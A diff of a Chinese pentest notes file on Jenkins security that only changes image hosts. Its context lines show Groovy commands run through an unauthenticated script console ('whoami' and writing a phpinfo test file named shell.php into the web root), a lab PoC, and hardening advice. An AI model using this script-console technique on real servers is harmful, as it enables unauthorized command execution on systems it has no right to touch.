@@ -27,7 +27,7 @@ service jenkinis start    # 开启Jenkins服务
 
 #### Jenkins未授权访问写shell
 1.点击“脚本命令行”
-![](http://image.xpshuai.cn/Jenkins_consele.png)
+![](http://image.geoer.cn/Jenkins_consele.png)
 
 2.执行系统命令
 ```bash
@@ -37,10 +37,10 @@ println "whoami".execute().text
 ```bash
 new File ("/var/www/html/shell.php").write('<?php phpinfo(); ?>');
 ```
-![](http://image.xpshuai.cn/Jenkins_cmd.png)
+![](http://image.geoer.cn/Jenkins_cmd.png)
 
 4.访问shell.php， 测试成功
-![](http://image.xpshuai.cn/Jenkins_shell.png)
+![](http://image.geoer.cn/Jenkins_shell.png)
 
 
 
@@ -117,19 +117,19 @@ Cache-Control: max-age=0
 ```
 
 进入容器: `docker-compose exec jenkins bash`,看到 /tmp/success文件创建成功
-![](http://image.xpshuai.cn/Jenkins_poc_ok.png)
+![](http://image.geoer.cn/Jenkins_poc_ok.png)
 
 
 
 #### 配置方面的安全问题
 1.允许任意账户注册 带来的安全问题
-![](http://image.xpshuai.cn/Jenkins_reg_any.png)
+![](http://image.geoer.cn/Jenkins_reg_any.png)
 关闭用户注册
-![](http://image.xpshuai.cn/Jenkins_reg.png)
+![](http://image.geoer.cn/Jenkins_reg.png)
 
 2.允许匿名访问带来的问题
 建议关闭
-![](http://image.xpshuai.cn/Jenkins_nologin.png)
+![](http://image.geoer.cn/Jenkins_nologin.png)
 
 
 
